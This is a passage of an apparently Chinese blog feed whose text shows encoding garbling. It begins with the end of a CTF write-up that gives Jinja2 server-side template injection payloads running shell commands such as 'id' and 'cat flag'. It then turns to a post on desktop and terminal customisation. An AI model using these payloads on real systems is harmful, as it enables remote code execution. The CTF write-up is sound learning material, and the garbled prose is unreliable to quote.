&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åå…¶å®ƒä¿¡æ¯æ­£å¸¸å¡«ï¼Œbodyéƒ¨åˆ†å­˜åœ¨sstiæ³¨å…¥ï¼Œpayloadæ¥è‡ªäº&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png" alt="image-20211004181339121">&lt;/p>
&lt;p>&lt;code>dsc{819_8r41n_m41L3R}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>è¯´å®è¯ï¼Œè¿™ä¸€ç¯‡wpæ—©å°±æ°´å®Œäº†ï¼Œä½†æ˜¯ä¸­é—´é‚£ä¸ªNever gonna lie to youçš„é¢˜å› ä¸ºæ²¡æœ‰åœ°æ–¹å¤ç°ä¹Ÿæ²¡æœç€åˆ«çš„wpå°±ä¸€ç›´æ‹–ç€ï¼Œæ‹–åˆ°ç°åœ¨ï¼Œè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ”¾å¼ƒäº†ï¼Œå¯æƒœæ­»äº†ï¼Œè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬åšé¢˜å¤ç°è¦è¶æ—©&lt;/p></description></item><item><title>Just Relax here......</title><link>https://amiaaaz.github.io/relax/</link><pubDate>Thu, 28 Oct 2021 18:36:27 +0800</pubDate><guid>https://amiaaaz.github.io/relax/</guid><description>&lt;p>é™¤äº†ç”µè„‘ï¼Œä»£ç ï¼Œç½‘ç»œä¹‹å¤–çš„ç”Ÿæ´»ï¼Œä¹Ÿæ˜¯è¦è®¤çœŸå¯¹å¾…å™¢&lt;/p></description></item><item><title>ç”Ÿäº§åŠ›æ(mei)é«˜(hua)ä¹‹è·¯</title><link>https://amiaaaz.github.io/2021/10/28/beautify-my-pc/</link><pubDate>Thu, 28 Oct 2021 13:42:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/28/beautify-my-pc/</guid><description>&lt;h2 id="å†™åœ¨å‰é¢">å†™åœ¨å‰é¢&lt;/h2>
&lt;p>è¿™å°†è‚¯å®šæ˜¯ä¸ªé•¿æœŸæ›´æ–°çš„ç³»åˆ—äº†â€¦â€¦&lt;/p>
&lt;p>æˆ‘å¯¹äºâ€œç¾åŒ–xxâ€æ€»æœ‰ä¸€ç§ç—´è¿·çš„çˆ±å¥½ï¼Œå°å­¦çš„æ—¶å€™å°±æŠ˜è…¾è¿‡é›¨æ»´æ¡Œé¢ï¼ˆç°åœ¨ç¿»qqé‚®ç®± è¿˜èƒ½æ‰¾åˆ°14å¹´çš„è¿œå¤é‚®ä»¶ï¼‰è™½ç„¶å¯æƒœçš„æ˜¯å½“æ—¶çš„æˆªå›¾æ²¡æœ‰ä¿ç•™ä¸‹æ¥ï¼Œä½†å°è±¡ä¸­æ˜¯å¾ˆæ¼‚äº®å¾ˆæ¼‚äº®çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729235145113.png" alt="image-20210729235145113">&lt;/p>
&lt;p>ä¹Ÿæ˜¯é‚£ä¸ªæ—¶å€™ï¼Œå¼€å§‹ç»™è‡ªå·±çš„æ‰‹æœºåˆ·æœº ä¸ºäº†æ¢æ›´å¥½çœ‹çš„å­—ä½“å’Œæ¨¡å—ï¼ˆé‚£æ˜¯ä¸ªæµ·ä¿¡çš„å®‰å“æœº å¾ˆä¾¿å®œ ä¹Ÿæ˜¯äººç”Ÿä¸­ç¬¬ä¸€éƒ¨æ‰‹æœºï¼‰ï¼Œå®³ å½“ç„¶ç”¨çš„æ˜¯xxä¸€é”®rootå·¥å…·ä¹‹ç±»çš„ï¼Œç»“æœåˆšåˆ·å¥½ä¸€ä¼šå°±å˜ç –äº† = =ï¼ˆå½“ç„¶è¿™ä¸é‡è¦ï¼‰&lt;/p>
&lt;p>åˆä¸­ä¹‹åæ‰‹æœºä¹Ÿæ¢æˆäº†å°ç±³ï¼Œæ›´æ˜¯ä¸‰å¤©ä¸¤å¤´çš„åˆ·ä¸»é¢˜å•†åº— æ„æ€æ€ä¹ˆæ··æ­å‡ºæœ€å¥½çœ‹çš„ä¸ªæ€§ä¸»é¢˜ï¼Œä½†æ˜¯ä¹Ÿå°±æ­¢æ­¥äºæ­¤ é«˜ä¸­ä¹‹åè¯¾ä½™æ—¶é—´å˜å°‘ï¼Œä¹Ÿæ…¢æ…¢æ²¡æœ‰ç©ºå¯¹è‡ªå·±çš„æ‰‹æœºå¥½å¥½çš„ç¾åŒ– ç”µè„‘æ›´æ˜¯ä¸æ€ä¹ˆç”¨äº†ï¼›å…¶é—´å€’æ˜¯å€’è…¾è¿‡ä¸€æ®µæ—¶é—´çš„é’¢ç¬”å½©å¢¨ ç°åœ¨è¿˜æœ‰ä¸å°‘å›¤è´§ï¼Œå›æ°´å‘€ é²¶é±¼å‘€ ç™¾ä¹å‘€ è¿˜æœ‰å¾ˆå¤šå…¶ä»–ç‰Œå­çš„å¢¨ç°åœ¨è¿˜éƒ½åœ¨ä¹¦æ¡Œçš„å°å­ä¸Šï¼Œå„ç§ &lt;del>èŠ±é‡Œèƒ¡å“¨åˆæ¯«æ— åµç”¨&lt;/del>ååˆ†å¥½çœ‹çš„ç¬”ç°åœ¨ä¹Ÿè¢«ç›¸å½“è§„æ•´çš„æ”¶åœ¨äº†ç”¨ä½œå±•ç¤ºçš„äºšå…‹åŠ›æ¶å­ä¸Šï¼ˆæ˜¯ä¸€ç§å¯ä»¥æ–œç€æ”¾ç¬”çš„æ¶å­ å›¾ç‰‡å¦‚ä¸‹ æˆ‘æœ‰6ä¸ªè¿™æ ·çš„æ”¶çº³ç¬”ç­’ å‹‰å¼ºå¤Ÿæ”¾æˆ‘çš„ç¬”ä»¬ï¼‰åŒ…æ‹¬å¾ˆå¤šå¾ˆè´µçš„é™å®šç¬”TAT &lt;del>ç°åœ¨å›å¤´å†çœ‹å¥½å¿ƒç–¼é’± å¤ªè´¥å®¶äº†&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210730003554519.png" alt="image-20210730003554519">&lt;/p>
&lt;p>å…œå…œè½¬è½¬ï¼Œç›´åˆ°å¤§ä¸€çš„å¯’å‡æ‰å†æŠŠæ‰‹æœºå’Œç”µè„‘æ–¹é¢çš„ç¾åŒ–ç»™æ‹¾èµ·æ¥ï¼Œç„¶è€Œæ´»åŠ›å’ŒåŠ²å¤´ä¸å‡å½“å¹´&lt;/p>
&lt;p>å‰å‡ å¤©æ­åšå®¢çš„æ—¶å€™å°±æƒ³ é™¤äº†wpå’Œä¸€äº›å­¦ä¹ ç¬”è®°ä¹‹å¤–ï¼Œè¿˜æœ‰ä»€ä¹ˆæ˜¯æ—¢å€¼å¾—è‡ªå·±è®°å½• åˆå€¼å¾—åˆ†äº«å‡ºæ¥çš„å‘¢ï¼Ÿ &lt;del>ï¼ˆè™½ç„¶å¹¶æ²¡æœ‰äººä¼šçœ‹å°±æ˜¯äº†ï¼‰&lt;/del> è„‘å­é‡Œç¬¬ä¸€ä¸ªè¹¦å‡ºæ¥çš„å°±æ˜¯&amp;quot;beautify&amp;quot;â€”â€”è¿™æ˜¯æœ€æœ€é€‚åˆä¸è¿‡çš„äº†ï¼ï¼ï¼&lt;/p>
&lt;h2 id="æ‰€ä»¥å…ˆç®€å•æ¦‚è¿°ä¸€ä¸‹ç°çŠ¶">æ‰€ä»¥å…ˆç®€å•æ¦‚è¿°ä¸€ä¸‹ç°çŠ¶&lt;/h2>
&lt;p>ç›®å‰çš„æ‰‹æœºæ˜¯å°ç±³10ï¼Œå¤‡ç”¨æœºæ˜¯å°ç±³5spï¼ˆæ²¡é”™ å°±æ˜¯é‚£ä¸ªéªé¾™825å‘çƒ­ç‹‚é­”â€¦â€¦æ— æ¯”åæ‚”å½“æ—¶å› ä¸ºå°ç±³6æ²¡æœ‰3.5mmè€³æœºå­”è€Œæ¯…ç„¶å†³ç„¶åœ°é€‰æ‹©äº†å®ƒï¼‰ç”µè„‘æ˜¯å°æ–°pro16ç‹¬æ˜¾ç‰ˆï¼Œç»¼åˆæ€§èƒ½éƒ½è¿˜å¯ä»¥&lt;/p>
&lt;p>æ‰‹æœºå’Œç”µè„‘ä½œä¸ºå¹³æ—¶çš„ä¸»è¦ç”Ÿäº§åŠ›å·¥å…·ï¼Œç¾åŒ–çš„æ–¹å‘å’Œæ³¨æ„ç‚¹ä¸»è¦æœ‰è¿™ä¹ˆå‡ ä¸ªï¼š&lt;/p>
&lt;ul>
&lt;li>è‰²å½©æ­é…è¦åˆç†ï¼Œç©ºé—´ç»“æ„è¦æœ‰åº&lt;/li>
&lt;li>æœ‰è½»å·§çš„å¿«æ·å°å·¥å…·æ¥æé«˜æ•ˆç‡&lt;/li>
&lt;li>è‡ªå·±ç”¨ç€å¾—ç§°å¿ƒé¡ºæ‰‹ï¼Œä¸éšæ³¢é€æµå»é€‰æ‹©è¿‡äºç¹æ‚çš„ç¾åŒ–æ–¹å¼&lt;/li>
&lt;li>å…¼å…·é¢œå€¼å’Œå®ç”¨æ€§ï¼Œå·¥å…·æœ€ç»ˆæœåŠ¡äºäººï¼Œä¸è¿½æ±‚é¢œå€¼è€Œç‰ºç‰²æ€§èƒ½&lt;/li>
&lt;/ul>
&lt;p>æ‰€ä»¥åŸºäºä»¥ä¸Šçš„ &lt;del>â€œåœ£ç»â€&lt;/del>â€œç¾åŒ–æ€è·¯â€ï¼Œæœ¬ç¯‡å…ˆä»æˆ‘çš„pcç®€å•è¯´èµ·å§(ã‚âˆ€ï½¥)â˜†&lt;/p>
&lt;p>â€”â€”â€”â€”é¢„è­¦ï¼šå¯èƒ½ä¼šå¾ˆé•¿å¾ˆé•¿ï¼Œå¤§æ¦‚ç‡ä¹‹åä¼šä¿®ä¿®è¡¥è¡¥å½¢æˆä¸€ä¸ªè¿~ç»­~å‰§~&lt;/p>
&lt;h2 id="æ·±è‰²æ¨¡å¼äº®è‰²æ¨¡å¼">æ·±è‰²æ¨¡å¼ï¼Ÿäº®è‰²æ¨¡å¼ï¼&lt;/h2>
&lt;p>ï¼ˆå…ˆç»™è‡ªå·±å å±‚ç”²ï¼‰æ‰‹æœºä¸Šæˆ‘è®¾ç½®æ™šä¸Š11ç‚¹ä»¥åè‡ªåŠ¨æ·±è‰²æ¨¡å¼å¹¶ä¸”éå¸¸å–œæ¬¢è¿™ä¸ªåŠŸèƒ½ï¼Œè®©æˆ‘æ™šä¸Šçœ‹æ‰‹æœºä¸å†çœ¼ç&lt;/p>
&lt;p>ä½†æ˜¯ï¼ï¼ï¼ä½†æ˜¯ï¼ï¼ï¼ä½¿ç”¨pcçš„åœºæ™¯éƒ½æ˜¯ç¯å¢ƒç¯å…‰æ­£å¸¸çš„æƒ…å†µï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹æ·±è‰²åº•é…ä¸Šç™½è‰²/èŠ±é‡Œèƒ¡å“¨è‰²çš„ä»£ç çœŸçš„ä¸ä¼šè®©äººçœ¼æ™•å—ï¼ï¼ï¼æˆ‘æ˜¯å®Œå…¨æ¥å—ä¸æ¥ï¼Œå“’å’©ï¼ï¼ï¼&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘çš„å„ç§terminal&amp;amp;ide&amp;amp;å…¶å®ƒç§ç§çš„é…è‰²ï¼Œå…¨ éƒ¨ éƒ½ æ˜¯ äº®è‰²æ¨¡å¼&lt;/p>
&lt;h3 id="kali">kali&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141310507.png" alt="image-20211028141310507">&lt;/p>
&lt;p>è¿™ä¸ªé¢œå€¼ä¸ç”¨å¤šè¯´å§ï¼ˆ&lt;/p>
&lt;h3 id="ubuntu">ubuntu&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028002711973.png" alt="image-20211028002711973.png">&lt;/p>
&lt;h3 id="vscode">vscode&lt;/h3>
&lt;p>ä¸»é¢˜ï¼šGithub Light Theme&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141355813.png" alt="image-20211028141355813">&lt;/p>
&lt;h3 id="idea">idea&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141605227.png" alt="image-20211028141605227">&lt;/p>
&lt;h2 id="ä¸€äº›åŸºç¡€è§‚å¿µ">ä¸€äº›åŸºç¡€è§‚å¿µ&lt;/h2>
&lt;h3 id="é…è‰²å¿…é¡»ç»Ÿä¸€">é…è‰²å¿…é¡»ç»Ÿä¸€&lt;/h3>
&lt;p>ä¸€å¼ å›¾å°±æ˜ç™½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171048130.png" alt="image-20211028171048130">&lt;/p>
&lt;p>edgeæˆ‘å–œæ¬¢å‚ç›´æ ‡ç­¾é¡µï¼Œä¼šè®©æ˜¾ç¤ºç©ºé—´å˜å¤§ï¼Œå¼€å››äº”åä¸ªæ ‡ç­¾é¡µçš„æ—¶å€™ä¾§æ ä¹Ÿä¸ä¼šæ‹¥æŒ¤ï¼Œä¸»é¢˜æ˜¯å†°å‡‰çš„è–„è·ï¼›Chromiumçš„ä¸»é¢˜æ˜¯Sea Foam&lt;/p>
&lt;p>edgeæ›¾ç»æˆ‘è§‰å¾—ä¸€ä¸ªç—›ç‚¹æ˜¯ä¸èƒ½ç»™æ ‡ç­¾é¡µåˆ†ç»„ï¼Œç›´åˆ°æœ€è¿‘çš„æ›´æ–°ä¸Šäº†è¿™ä¸ªåŠŸèƒ½ï¼Œé‚£è¿™å°±æ²¡å•¥è¯´çš„äº†ï¼Œåœ¨æˆ‘å¿ƒä¸­å·²ç»è¶…è¶Šäº†Chromeï¼Œedgeå¤©ä¸‹ç¬¬ä¸€ï¼&lt;/p>
&lt;h3 id="æ¡Œé¢å¿…é¡»ç®€æ´">æ¡Œé¢å¿…é¡»ç®€æ´&lt;/h3>
&lt;p>èƒŒæ™¯å›¾&lt;a href="https://www.pixiv.net/artworks/89931517">id=89931517&lt;/a>ï¼Œéšè—äº†æ¡Œé¢å›¾æ ‡å’Œåº•è¾¹ä»»åŠ¡æ ï¼ˆalt+tab æˆ–è€…ä¸‰æŒ‡çš„è§¦æ‘¸æ‰‹åŠ¿è¦æ¯”ç‚¹å‡»åˆ‡æ¢åº”ç”¨é¡µé¢æ›´æ–¹ä¾¿ï¼ˆå†µä¸”å¹³æ—¶åªæ˜¾ç¤ºæ¡Œé¢çš„æƒ…æ™¯å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯å¼€ä¸€å †å †çš„é¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171526659.png" alt="image-20211028171526659">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171228208.png" alt="image-20211028171228208">&lt;/p>
&lt;p>win10çš„ç£è´´æˆ‘çœŸçš„å¤ªçˆ±äº†&lt;/p>
&lt;p>é™¤äº†å¶å°”ä¼šå‡ºBug é‡å¯ä¸ªç³»ç»Ÿç»“æœæˆ‘æ’å¥½çš„é¡ºåºå…¨æ•´æ²¡äº†ğŸ˜…å´©è¿‡å¥½å‡ æ¬¡äº†å·²ç»&lt;/p>
&lt;p>æœ‰äº›å·¥å…·åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œå°±æ²¡æœ‰å…¨è´´ä¸Šæ¥äº†ï¼Œå®Œæ•´çš„å½¢æ€åº”è¯¥æ˜¯ä¸€ä¸ªå¿ƒå‹~&lt;/p>
&lt;h3 id="æŒ‡é’ˆå¿…é¡»èŠ±å“¨">æŒ‡é’ˆå¿…é¡»èŠ±å“¨&lt;/h3>
&lt;p>æœ‰è°èƒ½æ‹’ç»&lt;a href="https://weibo.com/5648640389/KDaUWnzaT?filter=hot&amp;amp;root_comment_id=0&amp;amp;type=comment#_rnd1635413766784">å°è±†æ³¥&lt;/a>å‘¢ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028175122377.png" alt="image-20211028175122377">&lt;/p>
&lt;h2 id="shellterminal">shell&amp;amp;terminal&lt;/h2>
&lt;h3 id="zshell">zshell&lt;/h3>
&lt;p>zhellå¤šå¥½ç”¨ä¸ç”¨æˆ‘å¤šè¯´å§ï¼Ÿkalié»˜è®¤çš„å°±æ˜¯zshellï¼Œé«˜äº®ã€ä»£ç è¡¥å…¨ç­‰åŠŸèƒ½æ˜¯çœŸçš„å¤ªè´´å¿ƒäº†ï¼Œbashè·Ÿå®ƒä¸€æ¯”çœŸæ˜¯ç›¸å½¢è§ç»Œï¼Œæ‰€ä»¥æˆ‘çš„linuxè™šæ‹Ÿæœºä»¥åŠvpséƒ½ä¸Šäº†zhell&amp;amp;oh-my-zshï¼›è¯•äº†ä¸€äº›ä¸»é¢˜ï¼Œä½†è¿˜æ˜¯é»˜è®¤çš„robbyrussellæ·±å¾—æˆ‘å¿ƒâ€¦â€¦&lt;/p>
&lt;p>åªæœ‰çš®è‚¤ä¹Ÿä¸è¡Œï¼Œè¿˜å¾—é…ä¸Šç»™åŠ›çš„æ’ä»¶â€”â€”&lt;a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting&lt;/a>ï¼ˆè¯­æ³•é«˜äº®ï¼‰å’Œ&lt;a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions&lt;/a>ï¼ˆæ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ï¼‰&lt;/p>
&lt;h3 id="windows-terminal">windows terminal&lt;/h3>
&lt;p>winè‡ªå¸¦çš„cmdå’Œpowershellï¼Œåªèƒ½è¯´æ‡‚å¾—éƒ½æ‡‚â€”â€”ä¸€ä¸ªæ˜¯å¤§é»‘æ¡†ä¸€ä¸ªæ˜¯å¤§è“æ¡†ï¼Œå‰è€…ç®€é™‹è‡³æï¼Œåè€…çš„æŠ¥é”™é¡µé¢ï¼ˆè“åº•çº¢å­—ï¼‰çœ‹ç€èƒ½è®©äººå¿ƒè·³éª¤åœï¼Œå³ä½¿æˆ‘å·²ç»å°½åŠ›è®¾ç½®èƒŒæ™¯é€æ˜ã€æ˜¾ç¤ºçš„é¢œè‰²ï¼Œå‡ºæ¥çš„æ•ˆæœä¹Ÿä¸å°½äººæ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171900582.png" alt="image-20211028171900582">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171947964.png" alt="image-20211028171947964">&lt;/p>
&lt;p>è¿™æ—¶Terminalè¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿å°±æ¥æ•‘åœºäº†â€”â€”é…åˆ&lt;a href="https://github.com/PowerShell/PowerShell/releases">pwsh7&lt;/a>&amp;amp;&lt;a href="https://github.com/JanDeDobbeleer/oh-my-posh2">oh-my-posh&lt;/a>å‡ ä¹å¯ä»¥è¾¾åˆ°ç±»zshçš„ä½“éªŒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028142743456.png" alt="image-20211028142743456">&lt;/p>
&lt;p>æ­¤å¤„çš„shellä¸»é¢˜æ˜¯ysï¼ˆå¯¹æ²¡çœ‹é”™ å°±æ˜¯zshä¸‹å¾ˆç«çš„é‚£ä¸ªï¼‰ï¼ŒèƒŒæ™¯å›¾&lt;a href="https://www.pixiv.net/artworks/89393158">id=89393158&lt;/a>ï¼Œé…è‰²æ–¹æ¡ˆæ˜¯&lt;a href="https://github.com/mbadolato/iTerm2-Color-Schemes/blob/master/windowsterminal/ayu_light.json">ayu_light&lt;/a>ï¼Œå­—ä½“æ˜¯12å·&lt;a href="https://github.com/microsoft/cascadia-code">Cascadia Code PL&lt;/a>ï¼›åŠ è½½äº†posh-gitå’Œoh-my-poshæ¨¡å—ï¼Œå¹¶è®¾ç½®äº†&lt;a href="https://docs.microsoft.com/zh-cn/powershell/module/psreadline/about/about_psreadline?view=powershell-7.1">PSReadLine&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028170400211.png" alt="image-20211028170400211">&lt;/p>
&lt;p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„pwshä¹Ÿæœ‰äº†æ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ã€tabé€‰æ‹©ç›®å½•è¿™æ ·çš„åŠŸèƒ½ï¼ˆæ›´å¤šçš„åŠŸèƒ½å¯ä»¥å‚ç…§å®˜æ–¹æ–‡æ¡£è‡ªè¡Œè®¾ç½®ï¼‰&lt;/p>
&lt;p>åŒæ—¶**win+`**è¿™ä¸ªå¿«æ·é”®å¯ä»¥å‘¼å‡ºä¸´æ—¶åœé çª—å£â€œç„¦ç‚¹ç»ˆç«¯â€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028143336429.png" alt="image-20211028143336429">&lt;/p>
&lt;p>å¯¹ä¸´æ—¶æƒ³è¦æ‰§è¡Œä¸ªè„šæœ¬ã€è¿ä»¥ä¸‹vpsã€æŸ¥ä¸ªä¸œè¥¿ä»€ä¹ˆçš„ç®€ç›´ä¸èƒ½æ›´æ–¹ä¾¿ï¼&lt;/p>
&lt;p>åŒæ—¶å®ƒè¿˜æ”¯æŒé€šè¿‡jsonæ¥æ·»åŠ é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å°†è‡ªå·±çš„vpsç›´æ¥åŠ è¿›æ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028164133371.png" alt="image-20211028164133371">&lt;/p>
&lt;p>å†è®¾ç½®ssh-keyå°±å¯ä»¥ä¸€é”®å…å¯†ç™»å½•å•¦äº†ï¼&lt;/p>
&lt;p>å”¯ä¸€çš„ç¼ºæ†¾ï¼Œå°±æ˜¯ä¸åƒfinal shellä¸€æ ·æœ‰å¾ˆå¥½çš„æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ä»¥åŠftpçš„åŠŸèƒ½ï¼Œä¸ç„¶å¯ä»¥ç›´æ¥é©äº†å…¶å®ƒsshç»ˆç«¯çš„å‘½ï¼ˆè¯´çš„å°±æ˜¯ä½  finalshellï¼‰&lt;/p>
&lt;h2 id="å¿…ä¸å¯å°‘çš„å°å·¥å…·">å¿…ä¸å¯å°‘çš„å°å·¥å…·&lt;/h2>
&lt;h3 id="everythinghttpswwwvoidtoolscomzh-cn">&lt;a href="https://www.voidtools.com/zh-cn/">everything&lt;/a>&lt;/h3>
&lt;p>æ›¾ç»å¹´å°‘è½»ç‹‚çš„æˆ‘å›ºæ‰§çš„è®¤ä¸ºè¿™ç§ä¸œè¥¿æ˜¯ç»™å‘½åæ–‡ä»¶ä¸è§„èŒƒçš„äººå‡†å¤‡çš„&lt;/p>
&lt;p>åæ¥æˆ‘å‘ç°æˆ‘é”™äº†â€¦â€¦everythingçœŸé¦™ï¼ï¼ï¼ï¼&lt;/p>
&lt;p>å®ƒèƒ½éå¸¸éå¸¸è¿…é€Ÿçš„æ‰¾åˆ°æˆ‘æƒ³è¦çš„æ–‡ä»¶ï¼Œè¿˜èƒ½è¿›è¡Œé¢„è§ˆï¼Œå¤ªå¥½ç”¨äº†ç®€ç›´æ˜¯&lt;/p>
&lt;h3 id="snipastehttpswwwsnipastecom">&lt;a href="https://www.snipaste.com/">Snipaste&lt;/a>&lt;/h3>
&lt;p>æœ€å¼ºæˆªå›¾å·¥å…·äº†ï¼Œæˆªå›¾åå¯ä»¥è´´åœ¨å±å¹•ä¸Šï¼Œè°ƒæ•´å¤§å°ã€é€æ˜åº¦ã€ç®€å•çš„æ¶‚é¸¦æ ‡æ³¨éƒ½ä¸åœ¨è¯ä¸‹ï¼Œå ç”¨å†…å­˜ä¹Ÿæ¯”è¾ƒå°ï¼Œè£…æœºå¿…å¤‡~&lt;/p>
&lt;h3 id="cclosehttpsgithubcomchaohershicclose">&lt;a href="https://github.com/chaohershi/cclose">CClose&lt;/a>&lt;/h3>
&lt;p>åˆä¸€ä¸ªè£…æœºå¿…å¤‡äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028165330401.png" alt="image-20211028165330401">&lt;/p>
&lt;p>å°±è¯´è¿™äº›åŠŸèƒ½è¿˜æœ‰è°ä¸å¿ƒåŠ¨ï¼ï¼ï¼ï¼ï¼ï¼å†…å­˜å ç”¨ä¹Ÿå¾ˆå°ï¼Œå¯ä»¥è¯´æå¤§çš„æå‡äº†æˆ‘å¹³å¸¸çš„å­¦ä¹ æ•ˆç‡&lt;/p>
&lt;p>ï¼ˆå»ºè®®è‡ªå¯åŠ¨+ä»¥ç®¡ç†å‘˜æ¨¡å¼å¼€å¯ï¼ˆé˜²æ­¢æŸäº›è¿‡äº†UACçš„åº”ç”¨å®ƒæ²¡æœ‰æƒé™&lt;/p>
&lt;h3 id="digital-clockhttpsgithubcommonodyledigitalclock">&lt;a href="https://github.com/monodyle/DigitalClock">Digital Clock&lt;/a>&lt;/h3>
&lt;p>å°±æ˜¯è¿™ä¸ªä¼šä¸€ç›´å‡ºç°åœ¨æˆ‘å„ç§æˆªå›¾ä¸­çš„å°éƒ¨ä»¶&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028164824172.png" alt="image-20211028164824172">&lt;/p>
&lt;p>å¤Ÿç®€å•ï¼Œè¿™ä¸ªå¤§å°æ”¾åœ¨å±å¹•ä¸Šä¹Ÿååˆ†åˆé€‚ï¼Œè¿˜å¯ä»¥è®¾ç½®é€æ˜åº¦ ä¸ä¼šæŒ¡åˆ°æ–‡å­—&lt;/p>
&lt;p>ä½†æ˜¯ä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹åœ¨å…³æœºçš„æ—¶å€™ä¼šæŠ¥ä¸ªé”™ï¼Œç„¶åä¸ä¼šä¿å­˜æˆ‘å·²è®¾ç½®å¥½çš„é¢œè‰²æ–¹æ¡ˆï¼Œå¯¼è‡´å†æ¬¡å¼€æœºåéœ€è¦é‡æ–°è®¾ç½®&lt;/p>
&lt;p>å¦å¤–è¿™ç©æ„çš„å†…å­˜å ç”¨ç«Ÿç„¶æœ‰16Mâ€¦â€¦æ„Ÿè§‰è·ŸåŠŸèƒ½å¹¶ä¸æ˜¯ååˆ†åŒ¹é…å•Š å°±åªä¸è¿‡åœ¨å±å¹•ä¸Šå±‚æ˜¾ç¤ºè€Œå·²ï¼ˆä½†æ˜¯å¾ˆå¯æƒœæ²¡æœ‰æ‰¾åˆ°é€‚åˆçš„æ›¿ä»£å“TAT&lt;/p>
&lt;h3 id="tilebeautifyhttpsgithubcombluepointlilactilebeautify">*&lt;a href="https://github.com/BluePointLilac/TileBeautify">TileBeautify&lt;/a>&lt;/h3>
&lt;p>ç£è´´ç¾åŒ–å·¥å…·ï¼Œå¯ä»¥å°†ç£è´´æ¢æˆä»»æ„çš„å›¾ç‰‡ï¼Œè¿›è¡Œç»„åˆä¹‹åä¼šå¾ˆå¥½çœ‹&lt;/p>
&lt;p>ï¼ˆä½†æ˜¯å§ æˆ‘æ¢ç”µè„‘ä¹‹åå°±æ²¡æŠ˜è…¾è¿™ä¸ªäº† å› ä¸ºä¸æ–¹ä¾¿&lt;/p>
&lt;hr>
&lt;p>è¯´å®è¯è¿™ç¯‡æ–‡æ¡£çš„åˆ›å»ºæ—¶é—´æ˜¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028175932903.png" alt="image-20211028175932903">&lt;/p>
&lt;p>åˆ«éª‚äº†ï¼Œéƒ½æ˜¯æˆ‘å¤ªæ‡’ç‹—&lt;/p>
